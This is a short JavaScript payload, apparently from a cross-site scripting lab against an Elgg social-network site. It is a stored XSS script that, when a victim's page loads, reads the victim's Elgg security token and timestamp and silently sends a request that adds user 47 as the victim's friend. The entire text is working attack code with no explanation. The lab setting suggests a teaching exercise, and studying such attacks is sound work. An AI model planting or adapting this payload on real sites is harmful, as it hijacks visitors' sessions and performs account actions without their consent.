<script type="text/javascript">
window.onload = function () {
  var Ajax = null;
  var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
  var token = "&__elgg_token="+elgg.security.token.__elgg_token;
  var base_url = "http://www.xsslabelgg.com/action/friends/add?friend=47";
  var send_url = base_url + ts + token;
  Ajax = new XMLHttpRequest();
  Ajax.open("GET", send_url, true);
  Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
  Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
  Ajax.send();
}
</script>